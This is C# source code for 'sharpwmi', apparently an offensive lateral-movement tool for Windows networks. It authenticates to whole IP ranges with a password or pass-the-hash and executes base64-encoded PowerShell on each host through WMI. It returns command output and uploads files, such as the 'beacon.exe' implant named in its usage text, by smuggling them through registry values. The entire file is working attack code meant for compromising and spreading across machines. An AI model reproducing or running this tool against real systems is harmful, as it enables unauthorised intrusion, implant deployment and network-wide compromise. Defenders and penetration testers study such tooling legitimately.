using System;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.Management;
using System.Collections.Generic;
using NetTools;

namespace sharpwmi
{
    class sharpwmi
    {
        ManagementScope scope;
        ConnectionOptions options;

        string method;
        string host;
        string username = "";
        string password = "";
        string command = "";
        string action = "";
        string local = "";
        string remote = "";


        int delay;
        sharpwmi(string method,string host,string username="",string password="",string command="",string action="",string local = "",string remote="")
        {
            options = new ConnectionOptions();
            delay = 1000;
            this.host = host;
            this.method = method;
            this.username = username;
            this.password = password;
            this.command = command;
            this.action = action;
            this.remote = remote;
            this.local = local;
        }

        public bool init(string host)
        {
            bool status=false;
            try {
                this.scope = new ManagementScope("\\\\" + host + "\\root\\cimv2", options);
                this.scope.Options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
                this.scope.Options.EnablePrivileges = true;
                this.scope.Connect();
                status = true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-]{this.host} {e.Message}");
            }
            return status;
        }
        public Int32 ExecCmd(string cmd)
        {

            using (var managementClass = new ManagementClass(this.scope,new ManagementPath("Win32_Process"),new ObjectGetOptions()))
            {
                var inputParams = managementClass.GetMethodParameters("Create");

                inputParams["CommandLine"] = cmd;

                var outParams = managementClass.InvokeMethod("Create", inputParams, new InvokeMethodOptions());
                return 1;
            }
        }

        public static string Base64Encode(string content)
        {
            byte[] bytes = Encoding.Unicode.GetBytes(content);
            return Convert.ToBase64String(bytes);
        }
        public static string Base64Decode(string content)
        {
            byte[] bytes = Convert.FromBase64String(content);
            return Encoding.Unicode.GetString(bytes);
        }


        public void run()
        {

            void cmd(string command)
            {
                string powershell_command = "powershell -enc " + Base64Encode(command);

                string code = "$a=(" + powershell_command + ");$b=[Convert]::ToBase64String([System.Text.UnicodeEncoding]::Unicode.GetBytes($a));$reg = Get-WmiObject -List -Namespace root\\default | Where-Object {$_.Name -eq \"StdRegProv\"};$reg.SetStringValue(2147483650,\"\",\"txt\",$b)";


                ExecCmd("powershell -enc " + Base64Encode(code));
                Console.WriteLine($"[+]{this.host} Exec done!\n");
                Thread.Sleep(delay);

                ManagementClass registry = new ManagementClass(this.scope, new ManagementPath("StdRegProv"), null);
                ManagementBaseObject inParams = registry.GetMethodParameters("GetStringValue");

                inParams["sSubKeyName"] = "";
                inParams["sValueName"] = "txt";
                ManagementBaseObject outParams = registry.InvokeMethod("GetStringValue", inParams, null);

                Console.WriteLine("[+]output -> \n\n" + Base64Decode(outParams["sValue"].ToString()));
            }

            void upload(string local_file, string remote_file)
            {


                byte[] str = File.ReadAllBytes(local_file);


                ManagementClass registry = new ManagementClass(this.scope, new ManagementPath("StdRegProv"), null);
                ManagementBaseObject inParams = registry.GetMethodParameters("SetStringValue");
                inParams["hDefKey"] = 2147483650;
                inParams["sSubKeyName"] = @"";
                inParams["sValueName"] = "upload";

                inParams["sValue"] = Convert.ToBase64String(str);
                ManagementBaseObject outParams = registry.InvokeMethod("SetStringValue", inParams, null);

                string pscode = string.Format("$wmi = [wmiclass]\"Root\\default:stdRegProv\";$data=($wmi.GetStringValue(2147483650,\"\",\"upload\")).sValue;$byteArray = [Convert]::FromBase64String($data);[io.file]::WriteAllBytes(\"{0:s}\",$byteArray);;", remote_file);
                string powershell_command = "powershell -enc " + Base64Encode(pscode);

                Thread.Sleep(delay);
                ExecCmd(powershell_command);
                Console.WriteLine($"[+]{this.host} Upload file done!");
                return;
            };


            if (this.method == "login")
            {
                options.Username = this.username;
                options.Password = this.password;
                if (!init(this.host)) { return; }
                if (this.action == "cmd")
                {
                    cmd(this.command);
                }
                else if(this.action == "upload")
                {
                    upload(this.local, this.remote);
                }
            }else if(this.method == "pth")
            {
                if (!init(this.host)) { return; }
                if (this.action == "cmd")
                {
                    cmd(this.command);
                }
                else if (this.action == "upload")
                {
                    upload(this.local, this.remote);
                }
            }

            //xxx
        }
        static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                Console.WriteLine("" +
                    "\n\t\tsharpwmi.exe login 192.168.2.3/24 administrator 123 cmd whoami\n\t\t" +
                    "sharpwmi.exe login 192.168.2.3-23 administrator 123 upload beacon.exe c:\\beacon.exe\n\t\t" +
                    "sharpwmi.exe pth 192.168.2.3-192.168.2.77 cmd whoami\n\t\t" +
                    "sharpwmi.exe pth 192.168.2.3/255.255.255.0 upload beacon.exe c:\\beacon.exe\n\t\t");
                return;
            }
            string method;
            string host;
            string username = "";
            string password = "";
            string command = "";
            string action = "";
            string local = "";
            string remote = "";

            method = args[0];
            host = args[1];
            IPAddressRange ipRange = IPAddressRange.Parse(host);

            if (method == "login")
            {

                username = args[2];
                password = args[3];
                action = args[4];
                if (action == "cmd")
                {
                    command = args[5];
                } else if (action == "upload")
                {
                    local = args[5];
                    remote = args[6];
                }
            } else if (method == "pth")
            {
                action = args[3];
                if (action == "cmd")
                {
                    command = args[4];
                }
                else if (action == "upload")
                {
                    local = args[4];
                    remote = args[5];
                }
            }
            string temp;

            void taskProc(string ip, ManualResetEvent manualResetEvent)
            {
                sharpwmi wmi = new sharpwmi(method, host: ip.ToString().Trim(), username: username, password: password, command: command, action: action, local: local, remote: remote);
                wmi.run();
                manualResetEvent.Set();
            }

            var waits = new List<EventWaitHandle>();

            Task[] tasks;
            int taskCount=0;
            foreach (var ip in ipRange)
            {
                var handler = new ManualResetEvent(false);
                waits.Add(handler);
                Task task = Task.Run(() => taskProc(ip.ToString().Trim(), handler));
            }

            //超64线程简易等待 
            foreach (var wait in waits.ToArray())
            {
                wait.WaitOne();
            }

        }
    }
}
